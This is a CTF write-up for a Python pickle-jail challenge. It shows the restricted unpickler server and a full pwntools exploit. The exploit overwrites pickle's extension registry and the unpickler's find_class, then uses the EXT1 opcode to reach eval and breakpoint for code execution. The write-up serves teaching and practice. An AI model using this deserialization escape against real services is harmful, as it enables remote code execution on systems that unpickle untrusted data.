# You shall not call Revenge

## challenge

Never have I seen a pickle, worming its way out of a jail, whose exploitation did not rely upon the calling of some nefarious function. Thus, I hereby declare: there shall be no call heeded within this domain anymore. It is for I yearn the secure confinement of pickles; and shall not stand their escape.

The server isn't changed, but you must get RCE to read flag this time.

server.py
```py
#!/usr/bin/env python3

import __main__
import pickle
import io

# Security measure -- forbid calls
for op in ['reduce', 'inst', 'obj', 'newobj', 'newobj_ex']: #pickle.REDUCE, pickle.INST, pickle.OBJ, pickle.NEWOBJ, pickle.NEWOBJ_EX]:
    id = getattr(pickle, op.upper())[0]
    delattr(pickle._Unpickler, pickle._Unpickler.dispatch[id].__name__)
    pickle._Unpickler.dispatch[id] = lambda _: print("Stop right there, you heineous criminal!") or exit()

# Security measure -- remove dangerous class and method
del pickle.Unpickler
del pickle._Unpickler.find_class

# Security measure -- overload unpickler with an actually secure class
class SecureUnpickler(pickle._Unpickler):
    def find_class(self, _: str, name: str) -> object:
        # Security measure -- prevent access to dangerous elements
        for x in ['exe', 'os', 'break', 'set', 'eva', 'help', 'sys', 'load', 'open', 'dis']:
            if x in name:
                print("Smuggling contraband in broad daylight?! Guards!")
                break
        # Security measure -- only the main module is a valid lookup target
        else:
            return getattr(__main__, name)

# Security measure -- remove dangerous magic
for k in list(globals()):
    if '_' in k and k not in ['__main__', '__builtins__']:
        del globals()[k]

# Security measure -- remove dangerous magic
__builtins__ = { k: getattr(__builtins__, k) for k in dir(__builtins__) if '_' not in k }

# My jail is very secure!
data = io.BytesIO(bytes.fromhex(input('$ ')))
SecureUnpickler(data).load()
```

there is also a readflag binary in some directory idk where but it is just to check that rce has been achieved

## solution

this one was enjoyable

the premise of this challenge was that we cant call any functions normally

```py
from pwn import *
from pickle import *

# for k in __main__.__builtins__:
#     setattr(__main__.__main__, k, __main__.__builtins__[v])
p = GLOBAL + b'__main__\n__main__\n' + PUT + b'1\n' + NONE + GLOBAL + b'__main__\n__builtins__\n' + TUPLE2 + BUILD

p += GLOBAL + b'__main__\nSecureUnpickler\n' + PUT + b'2\n'
p += GLOBAL + b'__main__\ngetattr\n' + PUT + b'3\n'

# pickle._inverted_registry = {0: [__main__.__main__, 'eval'], 1: 'breakpoint()'}
p += GLOBAL + b'__main__\npickle\n' + NONE + MARK + UNICODE + b'_inverted_registry\n' + MARK + INT + b'0\n' + MARK + GET + b'1\n' + UNICODE \
        + b'eval\n' + LIST + INT + b'1\n' + MARK + UNICODE + b'breakpoint()\n' + LIST + DICT + DICT + TUPLE2 + BUILD

# SecureUnpickler.find_class = getattr
p += GET + b'2\n' + NONE + MARK + UNICODE + b'find_class\n' + GET + b'3\n' + DICT + TUPLE2 + BUILD

# SecureUnpickler.find_class(*pickle._inverted_registry[0])
p += EXT1 + b'\x00' + PUT + b'4\n'  # we have access to eval now

# SecureUnpickler.find_class = eval
p += GET + b'2\n' + NONE + MARK + UNICODE + b'find_class\n' + GET + b'4\n' + DICT + TUPLE2 + BUILD + POP

# eval('breakpoint()')
p += EXT1 + b'\x01' + STOP

io = process(['python3', 'chall.py'])
io.sendline(p.hex().encode())
io.interactive()
```

the way that this worked was that we could first do a standard module-submodule builtins grab by using the `GLOBAL` opcode to do `getattr(__main__, "__main__")` and then 
also `getattr(__main__, "__builtins__")` and then building the dict (build opcode has almost arbitrary setattr)

then, we can store the `__main__.SecureUnpickler` class in the memo for later use. since we built the builtins dict onto the main module, we can also store the `getattr` function since it is not blocked by `find_class`

next, we can overwrite functions of SecureUnpickler because then the pickle implementation in pickle.py (i guess it would be _pickle.c but same thing pretty much) will call those functions. this is how we can end up calling functions

since eval, exec, and breakpoint are blocked (and there is no `exit` function cheese), we need to get the return value of a function like `getattr(__main__.__main__, 'eval')` to be able to get RCE

notably, it is hard to get the return value of functions. i tried exploiting some of the obvious opcodes like `SHORT_BINSTRING`, since it calls `_decode_string`. by overwriting the _decode_string of SecureUnpickler, we could just call any function and get the return value, right?

```py
    def _decode_string(self, value):
        # Used to allow strings from Python 2 to be decoded either as
        # bytes or Unicode strings.  This should be used only with the
        # STRING, BINSTRING and SHORT_BINSTRING opcodes.
        if self.encoding == "bytes":
            return value
        else:
            return value.decode(self.encoding, self.errors)
...

    def load_binstring(self):
        # Deprecated BINSTRING uses signed 32-bit length
        len, = unpack('<i', self.read(4))
        if len < 0:
            raise UnpicklingError("BINSTRING pickle has negative byte count")
        data = self.read(len)
        self.append(self._decode_string(data))   # THIS LINE RIGHT HERE
    dispatch[BINSTRING[0]] = load_binstring
```

(taken from [here](https://github.com/python/cpython/blob/3.10/Lib/pickle.py#L1322C1-L1348C44))

it is not possible to exploit this however since the input to the _decode_string function is bytes, and very few useful builtin functions accept byte inputs.

we can actually exploit the ext opcodes here

```py
    def get_extension(self, code):
        nil = []
        obj = _extension_cache.get(code, nil)
        if obj is not nil:
            self.append(obj)
            return
        key = _inverted_registry.get(code)
        if not key:
            if code <= 0: # note that 0 is forbidden
                # Corrupt or hostile pickle.
                raise UnpicklingError("EXT specifies code <= 0")
            raise ValueError("unregistered extension code %d" % code)
        obj = self.find_class(*key)  # THIS LINE RIGHT HERE
        _extension_cache[code] = obj
        self.append(obj)
```

(taken from [here](https://github.com/python/cpython/blob/3.10/Lib/pickle.py#L1556C1-L1570C25))

this function is called by all of the ext opcode implementations

notably, this function takes stuff from the inverted registry, which is empty by default. we can overwrite the inverted registry by doing our build setattr on the pickle module. this is pretty easy since the pickle module is retrievable from find_class.

so, with the pickle module, we overwrite the inverted registry with `{0: [__main__.__main__, 'eval'], 1: ['breakpoint()']}`. the idea with this is that we can overwrite self.find_class to be whatever, and then call any function with any arguments.

next, we overwrite the find_class with getattr so that we can get the eval attribute on the main module. then, we use the ext1 opcode to do the function call and get the eval function

we do that find_class overwrite once more with eval instead, and then `eval('breakpoint')`

## other thinkings

it may or may not be possible to use the dumps function and overwriting attributes of Pickler to overcome this, but likely it is not possible to do it that way (i am not willing to test this right now)
